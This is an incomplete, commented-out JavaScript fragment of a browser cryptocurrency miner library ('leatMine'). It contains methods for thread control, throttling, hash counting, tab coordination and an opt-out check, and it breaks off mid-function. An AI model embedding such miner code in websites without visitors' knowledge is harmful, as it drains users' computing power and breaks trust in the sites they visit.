/*(function(window) {


  ;
  Miner.prototype.stop = function(mode) {
    for (var i = 0; i < this._threads.length; i++) {
      this._totalHashesFromDeadThreads += this._threads[i].hashesTotal;
      this._threads[i].stop()
    }
    this._threads = [];
    this._autoReconnect = false;
    if (this._socket) {
      this._socket.close()
    }
    this._currentJob = null;
    if (this._autoThreads.interval) {
      clearInterval(this._autoThreads.interval);
      this._autoThreads.interval = null
    }
    if (this._tab.interval && mode !== "dontKillTabUpdate") {
      clearInterval(this._tab.interval);
      this._tab.interval = null
    }
  }
  ;
  Miner.prototype.getHashesPerSecond = function() {
    var hashesPerSecond = 0;
    for (var i = 0; i < this._threads.length; i++) {
      hashesPerSecond += this._threads[i].hashesPerSecond
    }
    return hashesPerSecond
  }
  ;
  Miner.prototype.getTotalHashes = function(estimate) {
    var now = Date.now();
    var hashes = this._totalHashesFromDeadThreads;
    for (var i = 0; i < this._threads.length; i++) {
      var thread = this._threads[i];
      hashes += thread.hashesTotal;
      if (estimate) {
        var tdiff = (now - thread.lastMessageTimestamp) / 1e3 * .9;
        hashes += tdiff * thread.hashesPerSecond
      }
    }
    return hashes | 0
  }
  ;
  Miner.prototype.getAcceptedHashes = function() {
    return this._hashes
  }
  ;
  Miner.prototype.getToken = function() {
    return this._tokenFromServer
  }
  ;
  Miner.prototype.on = function(type, callback) {
    if (this._eventListeners[type]) {
      this._eventListeners[type].push(callback)
    }
  }
  ;
  Miner.prototype.getAutoThreadsEnabled = function(enabled) {
    return this._autoThreads.enabled
  }
  ;
  Miner.prototype.setAutoThreadsEnabled = function(enabled) {
    this._autoThreads.enabled = !!enabled;
    if (!enabled && this._autoThreads.interval) {
      clearInterval(this._autoThreads.interval);
      this._autoThreads.interval = null
    }
    if (enabled && !this._autoThreads.interval) {
      this._autoThreads.adjustAt = Date.now() + this._autoThreads.adjustEvery;
      this._autoThreads.interval = setInterval(this._adjustThreads.bind(this), 1e3)
    }
  }
  ;
  Miner.prototype.getThrottle = function() {
    return this._throttle
  }
  ;
  Miner.prototype.setThrottle = function(throttle) {
    this._throttle = Math.max(0, Math.min(.99, throttle));
    if (this._currentJob) {
      this._setJob(this._currentJob)
    }
  }
  ;
  Miner.prototype.getNumThreads = function() {
    return this._targetNumThreads
  }
  ;
  Miner.prototype.setNumThreads = function(num) {
    var num = Math.max(1, num | 0);
    this._targetNumThreads = num;
    if (num > this._threads.length) {
      for (var i = 0; num > this._threads.length; i++) {
        var thread = new leatMine.JobThread;
        if (this._currentJob) {
          thread.setJob(this._currentJob, this._onTargetMetBound)
        }
        this._threads.push(thread)
      }
    } else if (num < this._threads.length) {
      while (num < this._threads.length) {
        var thread = this._threads.pop();
        this._totalHashesFromDeadThreads += thread.hashesTotal;
        thread.stop()
      }
    }
  }
  ;
  Miner.prototype.hasWASMSupport = function() {
    return window.WebAssembly !== undefined
  }
  ;
  Miner.prototype.isRunning = function() {
    return this._threads.length > 0
  }
  ;
  Miner.prototype.isMobile = function() {
    return /mobile|Android|webOS|iPhone|iPad|iPod|IEMobile|Opera Mini/i.test(navigator.userAgent)
  }
  ;
  Miner.prototype.didOptOut = function(seconds) {
    if (!leatMine.CONFIG.REQUIRES_AUTH) {
      return false
    }
    seconds = seconds || 60 * 60 * 4;
    var t = this._auth.getOptOutTime();
    return !!(t && t > Date.now() / 1e3 - seconds)
  }
  ;
  Miner.prototype._startNow = function() {
    if (this._tab.mode !== leatMine.FORCE_MULTI_TAB && !this._tab.interval) {
      this._tab.interval = setInterval(this._updateTabs.bind(this), 1e3)
    }
    if (this._tab.mode === leatMine.IF_EXCLUSIVE_TAB && this._otherTabRunning()) {
      return
    }
    if (this._tab.mode === leatMine.FORCE_EXCLUSIVE_TAB) {
      this._tab.grace = Date.now() + 3e3
    }

























}
*/
